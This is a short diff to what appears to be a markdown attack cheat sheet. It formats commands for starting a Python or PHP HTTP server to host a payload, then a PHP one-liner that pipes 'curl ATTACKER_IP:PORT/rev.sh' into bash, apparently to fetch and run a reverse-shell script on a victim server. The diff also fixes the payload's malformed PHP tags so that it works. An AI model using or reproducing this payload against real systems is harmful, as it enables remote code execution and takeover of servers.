@@ -4,11 +4,11 @@
 
 ### 1) Python
 
- - python3 -m http.server PORT
+    python3 -m http.server PORT
 
 ### 2) PHP
 
- - php -S 0.0.0.0
+    php -S 0.0.0.0
 
 ## 2nd step is creating a payload, then hosting it on your HTTP server
 
@@ -16,4 +16,4 @@
 
 ### 1) PHP
 
- - >?php system("curl ATTACKER_IP:PORT/rev.sh|bash"); ?<
+    <?php system("curl ATTACKER_IP:PORT/rev.sh|bash"); ?>
